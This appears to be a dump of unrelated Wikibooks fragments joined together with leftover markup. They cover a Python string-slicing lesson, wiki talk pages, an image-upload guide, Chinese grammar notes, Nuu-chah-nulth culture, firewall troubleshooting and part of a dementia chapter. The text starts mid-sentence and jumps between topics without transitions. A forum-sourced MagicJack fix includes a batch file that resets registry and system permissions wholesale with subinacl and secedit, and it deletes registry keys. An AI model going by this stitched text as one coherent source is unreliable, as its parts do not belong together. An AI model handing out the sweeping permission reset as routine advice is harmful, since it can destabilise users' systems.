&lt;tt&gt;text[1:4]&lt;/tt&gt; gives us all of the &lt;tt&gt;text&lt;/tt&gt; string between clipping places 1 and 4, &quot;&lt;tt&gt;TRI&lt;/tt&gt;&quot;. If you omit one of the [first_index:last_index] arguments, you get the beginning or end of the string as default: &lt;tt&gt;text[:5]&lt;/tt&gt; gives &quot;&lt;tt&gt;STRIN&lt;/tt&gt;&quot;. For both &lt;tt&gt;first_index&lt;/tt&gt; and &lt;tt&gt;last_index&lt;/tt&gt; we can use both the red and the blue numbering schema: &lt;tt&gt;text[:-1]&lt;/tt&gt; gives the same as &lt;tt&gt;text[:5]&lt;/tt&gt;, because the index -1 is at the same place as 5 in this case. If we do not use an argument containing a colon, the number is treated in a different way: &lt;tt&gt;text[2]&lt;/tt&gt; gives us one character following the second clipping point, &quot;&lt;tt&gt;R&lt;/tt&gt;&quot;. The special slicing operation &lt;tt&gt;text[:]&lt;/tt&gt; means &quot;from the beginning to the end&quot; and produces a copy of the entire string (or list, as shown in the previous chapter).

Last but not least, the slicing operation can have a second colon and a third argument, which is interpreted as the &quot;step size&quot;: &lt;tt&gt;text[::-1]&lt;/tt&gt; is &lt;tt&gt;text&lt;/tt&gt; from beginning to the end, with a step size of -1. -1 means &quot;every character, but in the other direction&quot;. &quot;&lt;tt&gt;STRING&lt;/tt&gt;&quot; backwards is &quot;&lt;tt&gt;GNIRTS&lt;/tt&gt;&quot; (test a step length of 2, if you have not got the point here).

All these slicing operations work with lists as well. In that sense strings are just a special case of lists, where the list elements are single characters. Just remember the concept of ''clipping places'', and the indexes for slicing things will get a lot less confusing.

=== Examples ===
&lt;source lang=&quot;python&quot;&gt;
# This program requires an excellent understanding of decimal numbers.
def to_string(in_int):
    &quot;&quot;&quot;Converts an integer to a string&quot;&quot;&quot;
    out_str = &quot;&quot;
    prefix = &quot;&quot;
    if in_int &lt; 0:
        prefix = &quot;-&quot;
        in_int = -in_int
    while in_int // 10 != 0:
        out_str = str(in_int % 10) + out_str
        in_int = in_int // 10
    out_str = str(in_int % 10) + out_str
    return prefix + out_str

def to_int(in_str):
    &quot;&quot;&quot;Converts a string to an integer&quot;&quot;&quot;
    out_num = 0
    if in_str[0] == &quot;-&quot;:
        multiplier = -1
        in_str = in_str[1:]
    else:
        multiplier = 1
    for c in in_str:
        out_num = out_num * 10 + int(c)
    return out_num * multiplier

print(to_string(2))
print(to_string(23445))
print(to_string(-23445))
print(to_int(&quot;14234&quot;))
print(to_int(&quot;12345&quot;))
print(to_int(&quot;-3512&quot;))
&lt;/source&gt;

== merge ==

I suggest merging the entire [[C &amp; C++ X]] book into the [[C++ Programming/Examples]] section of this C++ Programming book.
Both seem to have the same target audience and the same subject -- people who are learning C++ and want to see examples of C++ source code.
--[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 21:06, 8 July 2010 (UTC)

:The value is debatable most of the examples seem to already be present and other will not be only a direct move of the content, the present examples here are used in the book (aren't isolated), merging would require searching for proper places for inclusion. An alternative would be in the [[C++ Programming/Exercises|exercises]].  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 21:29, 8 July 2010 (UTC)

::There doesn't seem to be much of value in the book [[C &amp; C++ X]], and nobody seems to want to substantially extend it. I can see in principle the value in having two books, one a didactic style and the other a &quot;cookbook&quot; or &quot;learn by example&quot; book, but it would be far better to have one good book than two half-completed ones. If the content in [[C &amp; C++ X]] is duplicated in [[C++ Programming]] then I think the former should be deleted to keep the place tidy. --[[User:Fishpi|Fishpi]] ([[User talk:Fishpi|talk]]) 17:16, 24 July 2010 (UTC)

:::Agree. I will try to find a solution to this, the last 2 examples can probably be inserted somewhere. But it will not be a &quot;real&quot; merge since 75% will be deleted.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 19:49, 24 July 2010 (UTC)</text>

      <text xml:space="preserve">Hallo Tictoon,

you have written that you don't know how to add images to the wikibook, so if you like, I will give you a short tutorial about that.

Just answer to this comment, I have your page in my watchlist now and will see if you write something. 
--[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 09:03, 23 March 2009 (UTC)


Hi SoylentGreen,

Yeah, I'm pretty new at this wiki stuff so I dont get a lot of things, I spent a few minutes trying to figure out how to answer your comment! A quick tutorial on uploading images would be very appreciated, and sorry for my late reply, I had become VERY preoccupied, and well you know how life can throw you curve-balls sometimes...

Redards,
Tictoon

== How to upload images ==
* Every image has to be uploaded to commons.wikimedia.org. Don't upload images to en.wikibooks.org, or the image can't be reused (i.e. in other languages).
* Every image has to get a meaningful name, many images are named &quot;Blender3D_DescribingNameOfTheImage-VersionNumber.FileType&quot;, e.g. &quot;Blender3D_RenderPanel-2.49.png&quot;. This is a useful scheme. 
* Use PNG files for screenshots, jpgs for images.

# Read the page [[Blender 3D: Noob to Pro/Using proper copyright RE:Blender]]. Copy one of the example templates to your HD and fill in the necessary information. Save this file for reuse.
# Open the page [http://commons.wikimedia.org/w/index.php?title=Special:Upload&amp;uploadformstyle=basic]
# Select your image file.
# Copy and paste the filled in template in the Summary field.
# Upload the file. 

That should be it. Now you can include the image file like every other image from commons. 

If you have more questions, please don't hesitate to ask. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 15:18, 18 May 2009 (UTC)</text>

I suggest merging [[Help:Manual of Style]] into [[Wikibooks:Local manuals of style]].
Both of them are discussing the same thing -- tips on writing a local manual of style.
(As opposed to, say, [[Wikibooks:Manual of Style]], which is a manual of style for all Wikibooks).

Just want to point out one small erro in that text book writing.  It is  in Lesson One.

Here is the original:

东尼: 艾美，早上好。  東尼: 艾美，早安。&quot;

if you are going to use &quot;早上好&quot; then in Traditional part should be consistantly using  &quot;早上好&quot; but not &quot;zao an 早安&quot;.

'''For Vista:'''
(from a magicJack unofficial support forum entry)
http://www.phoneservicesupport.com/post35183.html#35183


After nearly a year of successfully using my MJ on my Vista Business laptop, I suddenly started getting the &quot;Warning: You must plug MagicJack into USB&quot; error. After spending nearly 2 hours on chat with the MJ &quot;techs,&quot; it became clear that they didn't have a clue as to the cause of the problem, though a quick Google search reveals that (1) it's endemic, and (2) it started around January or February. After tech support literally blew me off (&quot;Okay, I've adjusted your settings here. Reboot and it will work.&quot;, &quot;How can anything you do on your end affect this problem? Are you blowing me off?&quot;, &quot;Oh, no, I assure you it will work.&quot; It didn't work.), I spent another 6 hours on my own searching this site and the rest of the internet. I've been able to fix the problem but it took a combination of actions to do it -- no single fix took care of the problem -- so I thought I'd share them here.

First, a quick kluge to get around the problem:

After the &quot;Warning&quot; message opens up and the MJ opens a browser to the MJ site, open Computer, right click on the icon that says MagicJack or Phone, but not the one that says CD MagicJack and select &quot;Start MagicJack.&quot; The MJ will start right up and work fine. This is not a fix, however, as you will have to repeat the process each time you plug in the MJ.


Now, the fix:

0. THIS IS THE PROCEDURE FOR VISTA, ONLY. If you're running XP, you'll have to try something else. Because this procedure involves registry edits, I strongly recommend that, before beginning, you set a restore point and back up the registry.

Delete MagicJack from the computer

1. Manually delete the MagicJack folder under Program Files.

2. Manually delete the MJUSB folder, which is found here:

c:\users\[username]\appdata\roaming\mjusb

Reset the Registry permission

3. Download subinacl.exe from Microsoft here:

http://www.microsoft.com/downloads/details.aspx?familyid=e8ba3e56-d8fe-4a91-93cf-ed6985e3927b&amp;displaylang=en

Run the downloaded executable and let it install.

4. Open a text editor (Microsoft Notepad works fine) and enter the following (you can cut and past from this post):

cd /d &quot;%ProgramFiles%\Windows Resource Kits\Tools&quot;

subinacl /subkeyreg HKEY_LOCAL_MACHINE /grant=administrators=f /grant=system=f

subinacl /subkeyreg HKEY_CURRENT_USER /grant=administrators=f /grant=system=f

subinacl /subkeyreg HKEY_CLASSES_ROOT /grant=administrators=f /grant=system=f

subinacl /subdirectories %SystemDrive% /grant=administrators=f /grant=system=f

subinacl /subdirectories %windir%\*.* /grant=administrators=f /grant=system=f

secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose

You can also find the text here:

http://blog.tiensivu.com/aaron/archives/1412-Having-trouble-installing-the-Vista-SP1-update-Reset-your-registry-permissions!.html

Save the text file to the root directory (C:\) as RESET.CMD

Open Explorer and double click on RESET.CMD

This will reset all registry permissions and is a necessary step. This takes a long time -- go have dinner, take in a movie, or go out for a walk . . . or . . . go to step 4. You can do it while reset.cmd is running, but a lot of computer resources are used, so you might want to wait.

Format the MagicJack

4. Open Computer. Right click on MagicJack or Phone. Select Format. A window will open for formatting. Use the defaults and format the MJ.

Scrub out MagicJack keys from the Registry

5. In the Start Menu, click &quot;Run&quot; and type Regedit in the box. Hit return. This opens the Registry Editor.

6. Press CTL-F. This opens the search box. Type: magicjack and press Enter.

The software will find the first key containing magicjack. Delete it by right-clicking on the key in the left-hand window and selecting delete. The software will ask you to confirm the deletion. Select Yes.

7. Press F3 -- this will cause the software to search for the next instance of &quot;magicjack.&quot; Delete the key as described above. Keep pressing F3 and deleting found keys until you've worked your way through the registry. Note: there are LOTS of keys that must be deleted. Don't be surprised if there are 30, 40 or even 50 keys that must be deleted.

8. Use the slider to reposition the left-hand window on the very top entry and click it. Now open the following section:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR\

Find every instance of Disk&amp;Ven_YMAXxxxxxxxxxxxxxxx (the section identified by &quot;xxxxxxxx&quot; will vary from installation to installation).

Delete them. If the Registry won't allow you to delete them, you may need to change Ownership by right clicking on the key, selecting Permissions, Advanced and checking &quot;Full Control.&quot; You can find instructions on Google for doing this if you're having trouble.

9. Exit the Registry Editor and reboot.

Re-install the MagicJack

10. After your computer reboots, plug in the MagicJack. Vista will treat it as a new device and install it automatically.

11. After it has installed it will re-start. Either it will work or you'll get the &quot;Warning: You must plug MagicJack into USB&quot; error again. If you get the error, manually start the MagicJack by following the kluge procedure at the beginning of this post.

12. Once the MagicJack is up and running, click on Menu, Advanced, Run MagicFix. This will take you to the MJ website where you can click on Upgrade. Let the upgrade run -- you'll get the &quot;Lucky you -- you're getting an upgrade&quot; splash screen.

13. Once it has finished, leaving the MagicJack in place, reboot the computer.

That's it. The MagicJack should work normally and you shouldn't see the Warning: You must plug MagicJack into USB error again . . . at least until the next upgrade of MagicJack.

      <text xml:space="preserve">The name, Nu-Shah-Knuth, means: “All along the mountains and sea”
          

== Tribes ==


When Captain Cook first met these people, he referred to them as the Nootka, a mistaken name that has stuck with them for years. He grouped a bunch of tribes together all under the Nootka, yet they were different people. They all spoke the Wakashan Language with different variations from their own culture. (See language) Today, each Nuu-chah-nulth First Nation includes several chiefly families, and most include what were once considered several separate local groups.

 

Fourteen Nuu-chah-nulth First Nations are divided into three regions:

Sothern Region:Ditidaht, Huu-ay-aht, Hupacasath, Tse-shaht, and Uchucklesaht                                                                         

Central Region:Ahousaht, Hesquiaht, Tla-o-qui-aht, Toquaht, and Ucluelet

Northern Region:Ehattesaht, Kyuquot/Cheklesahht, Mowachat/Muchalaht, and Nuchatlaht



== Homes ==

Long houses at the water's edge.
Nuu-Chah-Nulth houses could be as long as 30 metres and were built with cedar beams and hand-split boards according to the same principles as Coast Salish houses. An example Nuu-Chah-Nulth house belonged to the head chief of the Tsesha'ath people who live near the present-day town of Port Alberni, at the head of Barkley Sound. The house stood in the 1800s. Although Nuu-Chah-Nulth houses were often set broadside to the beach, this house faced the beach. Below its large round doorway are ten round holes, representing ten moons. Above the entrance, two Thunderbirds face each other, and above each Thunderbird is the figure of a Lightning Snake, the supernatural servant of the Thunderbird. Above the Lightning Snake are two supernatural Codfish, facing each other.


== Language ==


Wakashan is one of the eleven native language families in Canada. The Wakashan language family is one of the six found in British Columbia alone. Wakashan has two main branches, Kwakiutl and Nuu-chah-nulth. Nuu-chah-nulth itself is divided into three languages. The northern and central Nuu-chah-nulth groups speak dialects of one language, while the southern group (Ditidaht and Makah) speak separate but closely related languages.




== Social Organization ==
  

The social organization of the Nuu chah nulth people was based on a stratified local group or lineage. The chief was at the top and his oldest son was to inherit everything, including becoming the title. The chief title was hereditary, and only men could be chiefs. Primogeniture. That's what it was. The Chief's younger sons and their families made the middle class and the other families were the commoners. They also kept slaves. No slave or commoner could ever become a chief.
Families were grouped and within those families, there was a recognized head of the family. Families were very important. Also, there was status within the families.

 

== Leadership and Government ==


The house chief, as the central authority figure, had charge of resources within his territory, and was entitled to receive a share of everything harvested in them. Although he was powerful, maintaining his high standing was heavily dependent on the support the chief and his family obtained in the community. The chief had to provide adequate protection for his people, and if he did not, they could leave him for a better chief. Also, since he would get a share of everyone's crops and gatherings, he could live well and have big potlatches (parties). Protection and these parties appealed to the people the most.  The relationship between a chief and his group can thus be referred to as a total social relationship: the chief relies on the members of his group to harvest the resources within his territory, and they rely upon him for his ability to provide them with ritual and economic security.

== Religion ==
 

Although whaling was more of a hunting ritual than a religion, it was part of their religion nevertheless. The whale harpooner was a person of high rank, and families passed down the magical and practical secrets that made for successful hunting. There was also a whale ritualist using ceremonial procedures, caused whales that had died of natural causes to drift ashore. Many features of this whaling complex suggest ancient ties with Eskimo and Aleut cultures. Their religion centred on shamanism and animism. The most important Nuu-chah-nulth ceremony was the shamans’ dance, a re-enactment of the kidnapping of an ancestor by supernatural beings who later gave him supernatural gifts and released him. The ceremony served to define each individual’s place in the social order. The public performance ended with a potlatch.

With the principle of &quot;hish-shuk-ish-tsawak&quot; which means &quot;All things are one or everything is connected&quot;, everything was important. Singing and dancing was part of their way of life. Story telling was important and community and family gatherings were important. Feasts and Potlatches were important.



== Dress ==


Both genders wore cedar-bark or fur robes pinned together at the right side, and women had in addition bark aprons extending from the waist to the knees.

 

== Food ==


The bulk of their food came from the sea: clams and urchins collected near the shorelines; salmon caught from the canoes as well as in and around spawning streams in fall; halibut fished in deep water far offshore; and sea mammals such as whales, seals and porpoises, all hunted from the canoes.



== Transportation ==


Dugout canoes, sturdy and heavy because they went hunting and traveling on the sea, where the waves were much bigger than in rivers and lakes. Also, they had to be strong enough to take some of the weight of whales, because they drag the whale back, tied to a team of canoes, to the village after hunting.



== Keeping track of time ==


They actually had names for each month of the year. The moon, especially was useful in keeping track of the time of year. Obviously, the four seasons also had names. For example, summer was &quot;tluu-piich&quot;. Knowing the four seasons served to keep one aware of one's age. Also, a coming of age for a female was very important and was marked by teachings for women delivered prior to a ceremony which marks one's coming of age (ready for womanhood). There was also a coming of age for manhood.



== Jobs ==


Prior to contact, the communities were fully self-contained, which means that most tribes wanted for almost nothing. If there was a need, then trade was conducted with tribes who were better able to provide. Each member of the tribe were trained to perform their specified tasks. In some cases, special training took place for river keepers and for speakers, as an example.



== Death ceremonies ==


In the old days, very little ceremony was conducted, when someone passed away, except for Ha'wiih (hereditary chiefs) or people of stature.

Rajesh,

Set the variable SDI to &lt;0&gt; and you should be good to go.

      <text xml:space="preserve">==Simple comparisons==

The primary word used for a comparison of two things (bigger, older, etc.) is 比 (''bǐ''). A simple comparison is constructed as '''X 比 Y SV'''.
:他比小明高。
:''Ta bi Xiao Ming gao.''
:He is taller than Xiao Ming.
Taken literally, this means that he, when compared with Xiao Ming, is tall.

==Negative comparisons==

A simple comparison can be negated by prepending 不 to 比:
:他不比小明高。
:''Ta bu bi Xiao Ming gao.''
:He is not taller than Xiao Ming.

[[Image:QW3 Tracker error.jpg|center]]


This error message indicates that Question Writer is having difficulty connecting to the internet. This can be for a number of different reasons.

===Internet Connection===

First of all you should check that you can access other websites on your computer, if you can then your internet connection is okay.

===Firewall===

It might also be that your firewall or security software is preventing access to the internet from Question Writer. This is likely to be the problem even if you can connect to the Question Writer Forum.  The forum link launches your browser, but the quiz upload accesses the internet directly from within the software.

Try disabling the firewall temporarily to see if that helps (and confirm if that is causing the problem) but remember to enable it again as it is not a good idea to keep your firewall switched off. 

Usually an alert will be displayed (from your firewall) asking you if you want to let the software (Question Writer) connect to the internet - you've got to tell it 'Yes'. If it doesn't ask, it might have an exception list where you can add Question Writer to the list of exceptions.  The steps to follow will depend on the firewall you're using - but if you've got Vista or XP, you can access the built in firewall at 

Start-&gt;Control Panel-&gt;Security Center-&gt;Windows Firewall-&gt;Allow a Program Through Windows Firewall-&gt;Add Program-&gt;Browse 

and Choose, 

C:\Program Files\Question Writer 4\QuestionWriter.exe 

Your firewall might also be on your router or corporate network in which case you may have less control over it.  You should speak to your systems administrator for help in resolving the problem.   

===Proxy Settings===

If your computer is on a network that uses a proxy to connect to the internet and you're using .NET 1.1, this can cause difficulties for Question Writer. If you think this might be the problem there are two ways to resolve the problem.

1. Uninstall the .NET 1.1 framework. You can do this in Add/Remove programs, and the relevant entry is 'Microsoft .NET Framework 1.1'. You'll need a more recent version of the framework installed too. You may already have one installed - try starting Question Writer to find out. If not, you can download .NET 2.0 from Microsoft.
[[http://www.microsoft.com/downloads/details.aspx?FamilyID=0856eacb-4362-4b0d-8edd-aab15c5e04f5]]

2. Change your proxy setting in Internet Explorer so they are are set statically, rather than dynamically. You can do this in
Tools -&gt; Internet Options -&gt; Connections -&gt; Lan Settings -&gt; Proxy Server.


[[image:QW3 Proxy server settings.jpg|center]]



Make sure 'Use a proxy server for your LAN' is checked.

The values for 'Address' and 'Port' should be available from your system administrator.

[[Category:Collections|WikiWork]]
&lt;u&gt;'''''Dementia, Delirium, and Psychiatric Symptoms Secondary to General Medical Conditions'''''&lt;/u&gt;

'''''Ronald Pies MD'''''

'''''Paul Summergrad MD'''''

&lt;u&gt;'''''Introduction'''''&lt;/u&gt;

In this chapter, we consider three related types of medical psychiatric disorders, usually accompanied by behavioral abnormalities: ''dementia,'' ''delirium'', and neurobehavioral disorders'' due to general medical conditions''. The common factor in these admittedly diverse conditions is a pathological alteration of brain structure and/or function, leading to abnormalities in cognition, affect, perception, or behavior. In the older U.S. literature, the term &quot;organic brain syndrome&quot; was often used to distinguish these conditions from so-called ''functional'' psychiatric disorders, such as schizophrenia or major depression. Indeed, the &quot;organic&quot; designation is retained in the ICD-10 classification (ICD-10, 1993).

In our view, however, the terms &quot;organic&quot; and &quot;functional&quot; suggest a false dichotomy. As we have learned more about the pathophysiology of common psychiatric disorders, such as schizophrenia or depression, the conceptual demarcation between these conditions and those discussed in the present chapter has become less distinct. For example, decreased metabolic function in frontal brain regions may be observed in both dementia and major depression, though the course and prognosis of these conditions differ markedly. Similarly, abnormalities in the cholinergic system may be present in both Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease and schizophrenia (Raedler et al, 2007), notwithstanding the many differences between these disorders. Advanced neuroimaging techniques, genetic studies, as well as abnormal neurobiologic function  in several animal models suggest receptor and circuit disturbances, even in the absence of traditional neurological abnormalities such as stroke or tumor. For all these reasons, we generally avoid the term &quot;organic&quot; in this chapter, but ''do'' use it when a particular study, author, or context justifies it.

The term &quot;cognitive disorder&quot; is often used to encompass delirium, dementia, and related conditions. This term appropriately emphasizes that a ''disturbance in memory, language, or attention'' is usually a cardinal feature of these disorders. However, the term &quot;cognitive disorder&quot; is far from ideal, since other aspects of consciousness, mood, and behavior may be strikingly abnormal in delirium, dementia, and related conditions. For example, the patient with frontal lobe dementia may show marked behavioral disinhibition, while the patient with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease and dementia may show signs of major depression.

The disorders discussed in this chapter are seen in many health-care environments, and are by no means confined to psychiatric settings. For example, between 11-16% of inpatients on general medical units may experience delirium at some time during their admission (Levkoff et al, 1991). In skilled nursing facilities, at least 14 % of residents may suffer from some form of dementia (Sabbagh et al, 2003), with some studies finding that more than 50% of nursing home beds are occupied by patients with Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (Sadock &amp; Sadock, 2007, p. 329). And while there are no reliable prevalence statistics for psychiatric symptoms due to general medical conditions (GMCs), these disorders appear to be common in emergency department (ED) settings, where they often go undiagnosed. Indeed, in one study ( Tintinalli et al, 1994) the chart was documented &quot;medically clear&quot; in 80% of ED patients in whom medical disease should have been identified.

Finally, a word about diagnostic systems: in most respects, there are more similarities than differences between the DSM-IV and ICD-10 classifications of the disorders discussed in this chapter; indeed, our discussion emphasizes ''common features'' rather than the specific criteria set forth in these two systems. However, when significant differences are clinically relevant, we will note them.

&lt;u&gt;'''''DEMENTIA'''''&lt;/u&gt;

&lt;u&gt;'''''Phenomenology (Characteristic Features of the Dementias)'''''&lt;/u&gt;

Dementia may be broadly defined as ''a progressive, acquired impairment of cognitive function sufficient to cause functional decline, and occurring in a relatively normal (&quot;clear&quot;) level of consciousness''; i.e., in the absence of delirium (Sadock &amp; Sadock, 2007; Apostolova &amp; Cummings, 2008). We shall see, however, that there are some notable exceptions to this generalization, and that it is often more useful to define specific types of dementia. ''Global impairment of the intellect'' is a cardinal feature of dementia. More specifically, most dementia syndromes demonstrating the following neurobehavioral deficits:

Memory impairment (either impaired ability to learn new information, or to recall previous information), usually evident for at least 6 months.

Deterioration in judgment, planning, and organizing (e.g., impaired shopping, cooking, handling money)

Absence of &quot;clouding of consciousness&quot; for a period long enough to demonstrate decline in memory

Decline in emotional control or motivation; or a change in social behavior (e.g., emotional lability, irritability, apathy, loss of social graces). DSM-IV specifically emphasizes a significant impairment in social and/or occupational functioning, as a result of the aforementioned deficits.

DSM-IV emphasizes one or more of the following: ''aphasia'' (language disturbance), ''apraxia ''(impaired ability to carry out motor activity despite intact motor function), ''agnosia'' (failure to recognize objects despite normal sensory function); and ''disturbance in executive functioning'' (planning, organizing, sequencing, abstracting). In partial contrast, ICD-10 regards these as essentially ''supportive'' findings for diagnosis of dementia.

The epidemiology, clinical features, and pathogenesis of dementia vary considerably, depending on the subtype; for example, ''dementia of the Alzheimer type (DAT), Vascular Dementia, Lewy Body Dementia'', etc. Nevertheless, it is common to encounter elderly patients in the clinical or nursing home setting who carry only the syndromic diagnosis of &quot;dementia&quot; (Jacobson et al, 2007).

It is worth noting that not all definitions of dementia require memory impairment as a diagnostic criterion; indeed, some patients with ''frontotemporal dementia'' (FTD) may be severely affected with ''behavioral disturbances'' before memory impairment is prominent (Jacobson et al, 2007).

Dementia must be distinguished from so-called ''mild cognitive impairment'' (MCI), which appears to represent an intermediate stage between normal aging and dementia (Apostolova &amp; Cummings, 2008). Unlike those with dementia, MCI patients do ''not'' show significant impairment in activities of daily living.

&lt;u&gt;'''''Epidemiology of the Dementias'''''&lt;/u&gt;

Dementia of some type may afflict as many as 28 million individuals world-wide, with direct costs for care estimated at 156 billion U.S. dollars (Wimo et al, 2006). Of the total number of demented individuals worldwide, the largest proportion (5.2 million, or 18.5%) lives in China (Wimo et al, 2006). If one groups all dementias together, the estimated prevalence is about 5% in the general population older than age 65, and 30% in those older than age 85 (Sadock and Sadock, 2007 p. 329). Findings on racial variations in dementia are somewhat equivocal, but most studies have reported higher frequencies of dementia among nonwhite persons (Husaini et al, 2003).  Disproportionately high rates of dementia among African-Americans may be due, in part, to a higher prevalence of both hypertension and stroke among elderly African-Americans. Women generally have higher rates of dementia than men, largely because women live longer (Husaini et al, 2003). However, vascular dementia appears to be more common in men.

Dementia of the Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Type (DAT, &quot;Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease&quot;) is by far the most common type of dementia, making up roughly 35%-60% of cases worldwide (Mendez &amp; Cummings, 2003; Sadock and Sadock, 2007, p. 329). The wide range of these figures is due in part to some controversy over the classification of ''Lewy Body Dementia'' (LBD); i.e., if LBD is considered a variant form of DAT (Sadock and Sadock, 2007, p. 329), the prevalence figure for DAT tends toward the higher end of the range. Many geriatric psychiatrists consider LBD to be the second most prevalent dementia subtype (&quot;tied&quot; with mixed vascular dementia/DAT), with a prevalence of about 15%. About 10% of dementias are said to be represent pure vascular dementia, while another 5% represent fronto-temporal dementia (Mendez and Cummings, 2003; Jacobson et al, 2007). Some data suggest that the DAT/vascular dementia ratio is comparatively higher in South America and lower in Asia (Lopes &amp; Bottino, 2002), though the reasons for these trends are not clear. Miscellaneous causes of dementia—including cases due to Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, Creutzfeld-Jakob Disease,  Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s, HIV infection, and other conditions—probably constitute fewer than 5% of the total.

That said, there is a paucity of ''autopsy-based studies'' of dementia prevalence, which would presumably be more accurate than those based on clinical diagnosis alone. In one of the few such studies (Fu et al, 2004),  202 demented patients underwent brain-only autopsies, and the following types of dementia were found: 129 (63.8%) cases showed changes of severe Alzheimer disease; 21 (10.4%) showed combined neuropathologic abnormalities (Alzheimer disease plus another type of lesion, such as significant ischemic infarcts or diffuse Lewy body disease), 12 (5.9%) cases of relatively pure ischemic vascular dementia, 13 (6.4%) cases of diffuse Lewy body disease, and 8 (4.0%) cases of frontotemporal dementia. The remaining 19 (9.4%) patients showed various neuropathologic diagnoses, including normal pressure hydrocephalus and progressive supranuclear palsy. Notably, the authors concluded that, had these diagnoses been known ante mortem, the clinical care of the patients might well have been different (Fu et al, 2004).

&lt;u&gt;'''''Clinical Features of Dementia Subtypes'''''&lt;/u&gt;

&lt;u&gt;'''''Cortical vs. subcortical distinction'''''&lt;/u&gt;

{|border=&quot;0&quot; cellspacing=&quot;2&quot; width=&quot;100%&quot;
|The older literature on dementia often describes two broad subtypes that encompass many of the more pathologically-specific types of dementia. Though the distinction between so-called ''cortical'' and ''subcortical ''dementias is controversial, it remains a useful conceptual tool in preparation for understanding more specific forms of dementia (Turner et al, 2002). Although there is no specific neuropsychological pattern in subcortical dementia, this group of disorders is generally characterized by ''cognitive slowness, concomitant motor abnormalities,'' and a relatively ''low frequency of aphasias and apraxias'', compared with Alzheimer-type dementia (Turner et al, 2002).  The principal differences between cortical and subcortical dementias are summarized in Table 1. It is important to note that some conditions—such as multiple small strokes and certain toxic-metabolic disorders—produce symptoms of ''both'' cortical and subcortical dysfunction (Cummings, 1985). Furthermore, the cortical/subcortical distinction has become less useful as our understanding of specific dementia syndromes has increased (Turner et al, 2002). Indeed, Lerner and Riley (2008) have pointed out that the dementias of Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s and Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease—two putative &quot;subcortical&quot; dementias—are as different from each other as they are from Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, the classic &quot;cortical&quot; dementia. Furthermore, these authors note that &quot;…the pathological basis for dementia in (Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease) is now known to lie in the cerebral cortex…effectively rendering its designation as a &quot;subcortical&quot; dementia untenable.&quot; (p. 908). In short—though useful as a rough, first-pass approximation—the designations &quot;cortical&quot; and &quot;subcortical&quot; are likely to be modified with more specific pathoanatomical and descriptive assessments.

&lt;u&gt;'''''Dementia of the Alzheimer Type (DAT)'''''&lt;/u&gt;

''Case vignette: Mrs. A, a 91-year-old widowed Caucasian woman in good general health, was seen by her family physician for complaints of &quot;forgetting things a lot lately.&quot; Mrs. A&lt;nowiki&gt;’&lt;/nowiki&gt;s daughter, who often helped her mother with household chores, had noticed a change in her mother&lt;nowiki&gt;’&lt;/nowiki&gt;s thinking and behavior over the past two years. &quot;Mom used to be sharp as a tack and never forgot a thing,&quot; she reported. &quot;Nowadays, she has trouble remembering even simple things, like turning off the stove, or in what room she keeps all her bills and papers. The other day, I found that she had left the bath running for over an hour, and it flooded the whole upstairs. Sometimes, Mom confuses me with her sister, who died over twenty years ago. When I try to explain who I am, Mom sometimes gets kind of irritable with me, and says I&lt;nowiki&gt;’&lt;/nowiki&gt;m trying to confuse her.&quot; There was no history suggestive of stroke, sudden change in mental status, or loss of gross motor or sensory function. On mental status exam, the patient was pleasant, socially appropriate, and in no acute distress. She was oriented to the year, but not to month, day, or date. She recalled only one word item after three minutes. She could not remember the name of the two most recent U.S. Presidents, but was able to speak knowledgeably about the Presidents during the U.S. Great Depression (1929-1941). When asked to name three objects on the physician&lt;nowiki&gt;’&lt;/nowiki&gt;s desk (stapler, paper clip, and calendar), she named them as &quot;stapler, paper grip, and day book.&quot; A provisional diagnosis of &quot;dementia, probably of the Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s type&quot; was made by the physician.''

As the vignette suggests, DAT (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease) is characterized most saliently by a gradual onset and progression of cognitive decline. Frank signs and symptoms of DAT often follow a prodromal stage of mild memory impairment that does not markedly interfere with activities of daily living. With disease progression, the patient shows more global cognitive decline, with disturbance in language, visuospatial skills, executive functioning, and social interaction. Typical of progressive DAT is a ''transcortical sensory aphasia, ''in which the patient shows fluent word output and preserved ability to repeat spoken language, but impaired speech comprehension (Apostolova &amp; Cummings, 2008). '' ''With further progression of DAT, the patient shows impaired judgment and reduced ability to carry out activities of daily living. Disturbances in sleep-wake cycle or appetite often ensue. Although depression is often considered a hallmark of ''subcortical'' dementias, it is actually a common feature in DAT. However, only about half of patients with depression/dysphoria in DAT meet full criteria for major depression (Apostolova &amp; Cummings, 2008). Irritability, agitation (including pacing, &quot;fidgeting&quot; or verbal outbursts) and psychotic features (such as visual hallucinations and delusions of having been robbed) are also common in DAT, and impose great emotional burdens on the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s family and caregivers. Patients with ''early-onset DAT'' (see under Pathogenesis) may show atypical features, such as prominent aphasia, myoclonic jerks, emotional lability, or obsessive-compulsive symptoms (Apostolova &amp; Cummings, 2008).

&lt;u&gt;'''''Vascular Dementias'''''&lt;/u&gt;

